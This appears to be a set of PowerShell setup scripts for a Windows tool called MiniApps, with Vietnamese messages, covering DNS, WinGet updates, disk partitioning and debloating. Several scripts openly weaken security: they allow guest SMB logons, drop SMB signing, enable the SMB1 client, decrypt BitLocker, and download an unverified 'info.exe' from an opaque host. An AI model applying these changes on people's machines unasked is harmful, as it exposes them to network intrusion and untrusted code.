$ErrorActionPreference = 'Stop'
$key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel'
New-Item -Path $key -Force | Out-Null
foreach ($id in @('{20D04FE0-3AEA-1069-A2D8-08002B30309D}', '{5399E694-6CE5-4D6C-8FCE-1D8870FDCBA0}', '{59031a47-3f72-44a7-89c5-5595fe6b30ee}')) {
    New-ItemProperty -Path $key -Name $id -PropertyType DWord -Value 0 -Force | Out-Null
}

$ErrorActionPreference = 'Stop'
$adapters = @(Get-NetAdapter -Physical | Where-Object Status -eq 'Up')
if ($adapters.Count -eq 0) { throw 'No active physical network adapter.' }
foreach ($adapter in $adapters) {
    Set-DnsClientServerAddress -InterfaceIndex $adapter.ifIndex -ServerAddresses @('1.1.1.1','8.8.8.8')
}

foreach ($setting in @('monitor-timeout-ac','monitor-timeout-dc','standby-timeout-ac','standby-timeout-dc')) {
    powercfg /change $setting 0
    if ($LASTEXITCODE -ne 0) { throw "powercfg failed: $setting ($LASTEXITCODE)" }
}

# Called only after explicit selection and Office/WPS confirmation. No upgrade --all.
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$work = Join-Path $env:TEMP ('winget-' + [Guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $work | Out-Null
$release = Invoke-RestMethod 'https://api.github.com/repos/microsoft/winget-cli/releases/latest' -TimeoutSec 60
$target = [version]($release.tag_name -replace '^v','')
function Get-ClientVersion {
    $cmd = Get-Command winget.exe -ErrorAction SilentlyContinue
    if (-not $cmd) { return $null }
    $text = & $cmd.Source --version
    if ($LASTEXITCODE -ne 0) { return $null }
    $parsed = $null
    if ([version]::TryParse(("$text".Trim() -replace '^v',''), [ref]$parsed)) { return $parsed }
    return $null
}
$before = Get-ClientVersion
if ($before -and $before -ge $target) { Write-Output "WinGet $before is already current (stable $target)."; return }
function Get-ReleaseAsset([string]$Name) {
    $asset = @($release.assets | Where-Object name -eq $Name)
    if ($asset.Count -ne 1 -or $asset[0].browser_download_url -notlike 'https://github.com/microsoft/winget-cli/releases/download/*') { throw "Missing official release asset: $Name" }
    $path = Join-Path $work $Name
    Write-Output "Downloading $Name" | Out-Host
    Invoke-WebRequest $asset[0].browser_download_url -OutFile $path -UseBasicParsing -TimeoutSec 600
    if ($asset[0].digest -notmatch '^sha256:([a-fA-F0-9]{64})$') { throw "Missing SHA-256 for $Name" }
    if ((Get-FileHash $path -Algorithm SHA256).Hash -ne $Matches[1]) { throw "SHA-256 mismatch: $Name" }
    return $path
}
$rawArch = if ($env:PROCESSOR_ARCHITEW6432) { $env:PROCESSOR_ARCHITEW6432 } else { $env:PROCESSOR_ARCHITECTURE }
$arch = switch ($rawArch) { 'AMD64' { 'x64' }; 'ARM64' { 'arm64' }; 'x86' { 'x86' }; default { throw "Unsupported architecture: $rawArch" } }
$depsPath = Get-ReleaseAsset 'DesktopAppInstaller_Dependencies.json'
$deps = (Get-Content -LiteralPath $depsPath -Raw | ConvertFrom-Json).Dependencies
if (-not $deps) { throw 'Dependency manifest is empty.' }
$missing = @($deps | Where-Object {
    $dep = $_
    -not (Get-AppxPackage -Name $dep.Name | Where-Object { ("$($_.Architecture)" -eq $arch -or "$($_.Architecture)" -eq 'Neutral') -and [version]$_.Version -ge [version]$dep.Version })
})
if ($missing.Count) {
    $zip = Get-ReleaseAsset 'DesktopAppInstaller_Dependencies.zip'
    $folder = Join-Path $work 'dependencies'
    Expand-Archive -LiteralPath $zip -DestinationPath $folder
    foreach ($dep in $missing) {
        $file = Get-ChildItem -LiteralPath (Join-Path $folder $arch) -Filter "$($dep.Name)_*.appx" | Select-Object -First 1
        if (-not $file) { throw "Missing dependency: $($dep.Name) for $arch" }
        Write-Output "Registering dependency $($dep.Name)"
        Add-AppxPackage -Path $file.FullName -ErrorAction Stop
    }
}
$bundle = Get-ReleaseAsset 'Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle'
Add-AppxPackage -Path $bundle -ErrorAction Stop
$after = Get-ClientVersion
if (-not $after -or $after -lt $target) { throw "WinGet verification failed. Expected $target; got $after." }
Write-Output "WinGet updated: $before -> $after"

$ErrorActionPreference = 'Stop'
$url = 'https://pub-50d6cf4af6964541b0621bbc9bc26690.r2.dev/info.exe'
$desktop = [Environment]::GetFolderPath('Desktop')
if ([string]::IsNullOrWhiteSpace($desktop)) { throw 'Cannot resolve the Desktop folder.' }
$destination = Join-Path $desktop 'info.exe'
$staged = Join-Path ([IO.Path]::GetTempPath()) ('MiniApps-info-' + [guid]::NewGuid().ToString('N') + '.exe')
try {
    Invoke-WebRequest -Uri $url -OutFile $staged -UseBasicParsing -ErrorAction Stop
    $stream = [IO.File]::OpenRead($staged)
    try {
        if ($stream.Length -lt 2 -or $stream.ReadByte() -ne 0x4D -or $stream.ReadByte() -ne 0x5A) {
            throw 'Downloaded file is not a Windows executable.'
        }
    }
    finally { $stream.Dispose() }
    Copy-Item -LiteralPath $staged -Destination $destination -Force -ErrorAction Stop
}
finally { Remove-Item -LiteralPath $staged -Force -ErrorAction SilentlyContinue }

# MiniApps Windows setting: make SMB file and printer sharing work on Windows 10/11.
#
# Windows 11 24H2 tightened SMB defaults. This undoes the parts that stop ordinary
# office and home networks from working, and leaves the rest of SMB's protection on:
#   - reaching NAS, printers and other PCs: guest (no password) shares and devices that
#     cannot sign SMB traffic, plus the SMB1 client for very old devices;
#   - sharing from this PC: network discovery and file/printer sharing on private and
#     domain networks only, never on public ones.
# Every step runs even if an earlier one fails; failures are listed at the end.

$ErrorActionPreference = 'Stop'
$failures = New-Object System.Collections.Generic.List[string]
$restart = $false

function Invoke-Step([string]$Name, [scriptblock]$Body) {
    try { & $Body; Write-Output "[OK] $Name" }
    catch { $failures.Add("$Name - $($_.Exception.Message)"); Write-Output "[LỖI] $Name - $($_.Exception.Message)" }
}

# --- Reaching other devices (SMB client) ---
Invoke-Step 'Cho phép vào thư mục share không mật khẩu (guest)' {
    Set-SmbClientConfiguration -EnableInsecureGuestLogons $true -Force
    # 24H2 also enforces this through policy; the policy value is what Windows reads first.
    $policy = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\LanmanWorkstation'
    New-Item -Path $policy -Force | Out-Null
    New-ItemProperty -Path $policy -Name AllowInsecureGuestAuth -PropertyType DWord -Value 1 -Force | Out-Null
}
Invoke-Step 'Không bắt buộc ký SMB khi kết nối tới thiết bị khác' {
    # Signing is still used whenever the other side supports it; only the requirement goes.
    Set-SmbClientConfiguration -RequireSecuritySignature $false -Force
}
Invoke-Step 'Bật SMB1 client cho thiết bị rất cũ (SMB1 server vẫn tắt)' {
    $client = Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol-Client
    if ($client.State -ne 'Enabled') {
        $result = Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol-Client -All -NoRestart
        if ($result.RestartNeeded) { $script:restart = $true }
    }
    # "Automatic removal" uninstalls SMB1 again after 15 days without use.
    $removal = Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol-Deprecation -ErrorAction SilentlyContinue
    if ($removal -and $removal.State -eq 'Enabled') {
        $result = Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol-Deprecation -NoRestart
        if ($result.RestartNeeded) { $script:restart = $true }
    }
    # This PC must never serve SMB1 to the network.
    Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
}

# --- Sharing from this PC (SMB server) ---
Invoke-Step 'Không bắt buộc ký SMB với máy kết nối vào máy này' {
    Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
}
Invoke-Step 'Đặt mạng đang dùng là Private' {
    # Discovery and sharing stay closed on Public networks, so the current one must be Private.
    # Domain networks are left alone: Windows manages them and they already allow sharing.
    foreach ($connection in @(Get-NetConnectionProfile | Where-Object NetworkCategory -eq 'Public')) {
        Set-NetConnectionProfile -InterfaceIndex $connection.InterfaceIndex -NetworkCategory Private
    }
}
Invoke-Step 'Bật Network discovery và File and Printer Sharing trên tường lửa (Private/Domain)' {
    # Groups by resource id, not display name: the names are translated on non-English Windows.
    foreach ($group in @('@FirewallAPI.dll,-32752', '@FirewallAPI.dll,-28502')) {
        $enabled = 0
        foreach ($rule in @(Get-NetFirewallRule -Group $group)) {
            $profiles = "$($rule.Profile)"
            if ($profiles -eq 'Public') { continue }
            # Some built-in rules cover several profiles at once ("Private, Public", "Any").
            # Public is taken out of those before enabling, so sharing never opens on public networks.
            $keep = if ($profiles -eq 'Any') { @('Domain', 'Private') } else { @($profiles -split ',\s*' | Where-Object { $_ -ne 'Public' }) }
            if ($keep.Count -ne @($profiles -split ',\s*').Count -or $profiles -eq 'Any') {
                Set-NetFirewallRule -InputObject $rule -Profile $keep
            }
            Enable-NetFirewallRule -InputObject $rule
            $enabled++
        }
        if ($enabled -eq 0) { throw "Không tìm thấy rule Private/Domain trong nhóm $group." }
    }
}
Invoke-Step 'Bật các dịch vụ chia sẻ và hiển thị máy trong mục Network' {
    foreach ($name in @('LanmanServer', 'LanmanWorkstation', 'FDResPub', 'fdPHost', 'SSDPSRV', 'upnphost')) {
        $service = Get-Service -Name $name -ErrorAction SilentlyContinue
        if (-not $service) { continue }
        Set-Service -Name $name -StartupType Automatic
        if ($service.Status -ne 'Running') { Start-Service -Name $name }
    }
}

if ($restart) { Write-Output 'Cần khởi động lại máy để SMB1 client có hiệu lực.' }
if ($failures.Count -gt 0) { throw "SMB: $($failures.Count) bước chưa xong: $($failures -join '; ')" }

# MiniApps Windows setting: split the system disk into C:, D: (and E:), following the
# rules of the CLI's $DiskScript in Setup.ps1 (formerly config/disk.ps1):
#
#   - C: is relabelled "OS" (label only, no formatting).
#   - BitLocker on C: is decrypted first; it pins files at the end of the volume and blocks
#     shrinking. The wait is capped at 60 minutes.
#   - The disk holding C: is classed by size and split with .1 GB padding, so This PC shows
#     round numbers after NTFS overhead:
#         200-300 GB   -> D: "LOCAL I" 50.1 GB
#         400-600 GB   -> D: "LOCAL I" 200.1 GB
#         800-1100 GB  -> D: "LOCAL I" 400.1 GB and E: "LOCAL II" 200.1 GB
#   - Safety interlocks: nothing is done on a disk over 1100 GB, on a size outside those
#     classes, or when D: or E: already exists; the run stops if C: would drop to 30 GB or less.
#   - Hibernation is turned off first: hiberfil.sys cannot be moved and blocks shrinking.
#
# Outcome: a skip required by those rules ends normally; a stop caused by a problem, or any
# failure, ends with an error so the Windows Setting row shows it failed.
param(
    # Print the plan for this machine without changing anything.
    [switch]$DryRun
)

# MiniApps runs settings under 'Stop'. Critical cmdlets opt in with -ErrorAction Stop; native
# tools such as manage-bde must not be able to end the run by writing to stderr.
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'

$LabelC = 'OS'
$LabelD = 'LOCAL I'
$LabelE = 'LOCAL II'
$MinimumC = 30GB

$osPartition = Get-Partition -DriveLetter C -ErrorAction Stop
$osDisk = Get-Disk -Number $osPartition.DiskNumber -ErrorAction Stop
$totalGB = [Math]::Round($osDisk.Size / 1GB, 1)

if ($totalGB -gt 1100) { Write-Output "Bỏ qua: ổ $totalGB GB, vượt giới hạn an toàn 1100 GB."; return }
if ($totalGB -ge 200 -and $totalGB -le 300) { $plan = @{ SizeD = 50.1GB; SizeE = 0; HasE = $false }; $planName = 'C: phần còn lại, D: 50.1 GB' }
elseif ($totalGB -ge 400 -and $totalGB -le 600) { $plan = @{ SizeD = 200.1GB; SizeE = 0; HasE = $false }; $planName = 'C: phần còn lại, D: 200.1 GB' }
elseif ($totalGB -ge 800 -and $totalGB -le 1100) { $plan = @{ SizeD = 400.1GB; SizeE = 200.1GB; HasE = $true }; $planName = 'C: phần còn lại, D: 400.1 GB, E: 200.1 GB' }
else { Write-Output "Bỏ qua: ổ $totalGB GB không thuộc nhóm 256 GB / 512 GB / 1 TB."; return }

# Never re-partition a machine that already has D: or E:.
if ((Get-Partition -DriveLetter D -ErrorAction SilentlyContinue) -or (Get-Partition -DriveLetter E -ErrorAction SilentlyContinue)) {
    Write-Output 'Bỏ qua: máy đã có ổ D: hoặc E:, không chia lại.'
    return
}

$targetC = $osPartition.Size - ($plan.SizeD + $plan.SizeE)
if ($targetC -le $MinimumC) { throw "Dừng: C: sẽ còn $([Math]::Round($targetC / 1GB, 1)) GB, dưới mức tối thiểu 30 GB. Không thay đổi gì." }
Write-Output "Ổ hệ thống $totalGB GB. Kế hoạch: $planName."
if ($DryRun) { Write-Output "DRY RUN: C: sẽ còn $([Math]::Round($targetC / 1GB, 1)) GB; không thay đổi gì."; return }

# STEP 1: relabel C: (label only; a failure here does not stop the split).
try { Set-Volume -DriveLetter C -NewFileSystemLabel $LabelC -ErrorAction Stop; Write-Output "Đổi tên C: thành '$LabelC'." }
catch { Write-Output "Không đổi được tên C: ($($_.Exception.Message))." }

# STEP 2: BitLocker off, with a bounded wait.
if (Get-Command Get-BitLockerVolume -ErrorAction SilentlyContinue) {
    $bde = Get-BitLockerVolume -MountPoint C: -ErrorAction SilentlyContinue
    if ($bde -and $bde.VolumeStatus -ne 'FullyDecrypted') {
        Write-Output 'BitLocker đang bật trên C:, đang giải mã (có thể lâu)...'
        Disable-BitLocker -MountPoint C: -ErrorAction SilentlyContinue | Out-Null
        & manage-bde -off C: 2>&1 | Out-Null
        $deadline = (Get-Date).AddMinutes(60)
        do {
            $status = (Get-BitLockerVolume -MountPoint C: -ErrorAction SilentlyContinue).VolumeStatus
            if (-not $status -or $status -eq 'FullyDecrypted') { break }
            Start-Sleep -Seconds 5
        } while ((Get-Date) -lt $deadline)
        if ($status -and $status -ne 'FullyDecrypted') { throw 'Dừng: BitLocker vẫn đang giải mã sau 60 phút; chưa chia ổ.' }
        Write-Output 'Đã tắt BitLocker trên C:.'
    }
}

# STEP 3: shrink C:. Hibernation goes first; Windows is then asked how far C: can shrink,
# so an impossible target stops here before anything on the disk changes.
& powercfg /h off 2>&1 | Out-Null
$supported = Get-PartitionSupportedSize -DriveLetter C -ErrorAction Stop
if ($targetC -lt $supported.SizeMin) {
    throw "Dừng: Windows chỉ thu nhỏ được C: tới $([Math]::Round($supported.SizeMin / 1GB, 1)) GB (cần $([Math]::Round($targetC / 1GB, 1)) GB). Chưa chia ổ; đã tắt Hibernate để thử."
}
Resize-Partition -DriveLetter C -Size $targetC -ErrorAction Stop
Write-Output "Đã thu nhỏ C: còn $([Math]::Round($targetC / 1GB, 1)) GB."

function New-DataVolume([UInt64]$Size, [string]$Letter, [string]$Label) {
    # A fixed size when another partition follows; otherwise all of the freed space.
    $partition = if ($Size -gt 0) {
        New-Partition -DiskNumber $osDisk.Number -Size $Size -AssignDriveLetter -ErrorAction Stop
    } else {
        New-Partition -DiskNumber $osDisk.Number -UseMaximumSize -AssignDriveLetter -ErrorAction Stop
    }
    Start-Sleep -Seconds 3
    Update-HostStorageCache
    $lastError = 'chưa thử lần nào'
    for ($i = 0; $i -lt 10; $i++) {
        try {
            # Format-Volume has no -Quick switch (quick is the default): passing one fails at
            # binding and leaves the volume RAW. It is bound by partition because a new RAW
            # partition is not always visible to Get-Volume yet.
            $current = Get-Partition -DiskNumber $osDisk.Number -PartitionNumber $partition.PartitionNumber -ErrorAction Stop
            Format-Volume -Partition $current -FileSystem NTFS -NewFileSystemLabel $Label -Force -Confirm:$false -ErrorAction Stop | Out-Null
            Update-HostStorageCache
            $volume = Get-Partition -DiskNumber $osDisk.Number -PartitionNumber $partition.PartitionNumber | Get-Volume -ErrorAction Stop
            if ($volume.FileSystem -match 'NTFS') { break }
            $lastError = "ổ báo FileSystem='$($volume.FileSystem)'"
        }
        catch { $lastError = $_.Exception.Message; Start-Sleep -Seconds 3 }
        if ($i -eq 9) { throw "Không format được ${Letter}: - $lastError" }
    }
    if ($partition.DriveLetter -ne $Letter) {
        Set-Partition -DiskNumber $osDisk.Number -PartitionNumber $partition.PartitionNumber -NewDriveLetter $Letter -ErrorAction SilentlyContinue
    }
    Write-Output "Đã tạo ${Letter}: '$Label'."
}

# STEP 4/5: D:, then E: for the 1 TB class (D: takes its exact size so E: gets the rest).
New-DataVolume -Size $(if ($plan.HasE) { [UInt64]$plan.SizeD } else { 0 }) -Letter 'D' -Label $LabelD
if ($plan.HasE) { New-DataVolume -Size 0 -Letter 'E' -Label $LabelE }
Write-Output "Chia ổ xong: $planName."

# MiniApps Windows setting "Debloatware Windows": run Win11Debloat (https://github.com/Raphire/Win11Debloat) in its default mode.
#
# Pinned to one release and checked by SHA-256, so every machine runs the same reviewed code.
# To move to a newer release, change $Version and $Sha256 together.
#
# The release is kept under $InstallRoot after the run: Win11Debloat writes its registry
# backups (Backups\) and its log (Logs\) inside its own folder, and deleting that folder
# would delete the only way back.
param(
    [string]$InstallRoot = (Join-Path $env:LOCALAPPDATA 'MiniApps\Win11Debloat'),
    # Download, verify and unpack, then print the command instead of running it.
    [switch]$DryRun
)

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
[Console]::OutputEncoding = [Text.Encoding]::UTF8
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$Version = '2026.08.24'
$Sha256 = '00D1487B2E9B9691653774CC781ED3844E4B2FD5B0D91C32F6F78AA8C7892BD4'
$Url = "https://github.com/Raphire/Win11Debloat/archive/refs/tags/$Version.zip"

$target = Join-Path $InstallRoot $Version
$entry = Join-Path $target 'Win11Debloat.ps1'

if (-not (Test-Path -LiteralPath $entry)) {
    if (Test-Path -LiteralPath $target) {
        # Never replace a folder we did not finish writing: it may already hold registry backups.
        throw "Thư mục $target có sẵn nhưng thiếu Win11Debloat.ps1. Hãy kiểm tra và xóa thủ công rồi chạy lại."
    }
    New-Item -ItemType Directory -Force -Path $InstallRoot | Out-Null
    # Short working names keep every unpacked path well under Windows' 260-character limit.
    $zip = "$target.zip"
    $partial = "$target.partial"
    try {
        for ($attempt = 1; ; $attempt++) {
            try {
                Write-Output "Đang tải Win11Debloat $Version (lần $attempt)..."
                Invoke-WebRequest -Uri $Url -OutFile $zip -UseBasicParsing -TimeoutSec 300
                break
            }
            catch {
                if ($attempt -ge 3) { throw "Không tải được Win11Debloat: $($_.Exception.Message)" }
                Start-Sleep -Seconds (5 * $attempt)
            }
        }
        $actual = (Get-FileHash -LiteralPath $zip -Algorithm SHA256).Hash
        if ($actual -ne $Sha256) { throw "SHA-256 của bản tải về không khớp (nhận $actual). Không chạy gì." }
        Write-Output "Đã xác minh SHA-256, đang giải nén..."
        # A .partial folder is only ever our own unfinished unpack; nothing has run from it.
        if (Test-Path -LiteralPath $partial) { Remove-Item -LiteralPath $partial -Recurse -Force }
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        $root = [IO.Path]::GetFullPath($partial) + '\'
        $prefix = "Win11Debloat-$Version/"
        $archive = [IO.Compression.ZipFile]::OpenRead($zip)
        try {
            foreach ($item in $archive.Entries) {
                # GitHub wraps the tree in one Win11Debloat-<version>/ folder; drop it while unpacking.
                if (-not $item.FullName.StartsWith($prefix)) { throw 'Gói Win11Debloat không đúng cấu trúc mong đợi.' }
                $relative = $item.FullName.Substring($prefix.Length)
                if (-not $relative) { continue }
                $destination = [IO.Path]::GetFullPath((Join-Path $partial $relative))
                if (-not $destination.StartsWith($root, [StringComparison]::OrdinalIgnoreCase)) { throw "Đường dẫn không hợp lệ trong gói: $($item.FullName)" }
                if ($item.FullName.EndsWith('/')) { New-Item -ItemType Directory -Force -Path $destination | Out-Null; continue }
                New-Item -ItemType Directory -Force -Path (Split-Path -Parent $destination) | Out-Null
                [IO.Compression.ZipFileExtensions]::ExtractToFile($item, $destination, $true)
            }
        }
        finally { $archive.Dispose() }
        if (-not (Test-Path -LiteralPath (Join-Path $partial 'Win11Debloat.ps1'))) { throw 'Gói Win11Debloat thiếu Win11Debloat.ps1.' }
        Rename-Item -LiteralPath $partial -NewName (Split-Path -Leaf $target)
    }
    finally {
        Remove-Item -LiteralPath $zip -Force -ErrorAction SilentlyContinue
        Remove-Item -LiteralPath $partial -Recurse -Force -ErrorAction SilentlyContinue
    }
}
else {
    Write-Output "Dùng Win11Debloat $Version đã có tại $target."
}

$powershell = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
# Win11Debloat needs Windows PowerShell 5.1, hence powershell.exe by full path. It is run as a
# child process because it ends with Exit, which would otherwise end this script as well.
$arguments = @('-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File', $entry, '-RunDefaults', '-Silent')
if ($DryRun) {
    Write-Output "DRY RUN: $powershell $($arguments -join ' ')"
    exit 0
}

Write-Output 'Đang chạy Win11Debloat ở chế độ mặc định. Có thể mất 5-15 phút; Explorer sẽ khởi động lại.'
# Windows PowerShell 5.1 turns every stderr line of a native command into a terminating error
# under 'Stop'; Win11Debloat reports failed app removals that way and must be allowed to finish.
$ErrorActionPreference = 'Continue'
& $powershell @arguments 2>&1 | ForEach-Object { "$_" }
$code = $LASTEXITCODE
Write-Output "Win11Debloat kết thúc với mã $code. Nhật ký chi tiết: $(Join-Path $target 'Logs\Win11Debloat.log')"
exit $code
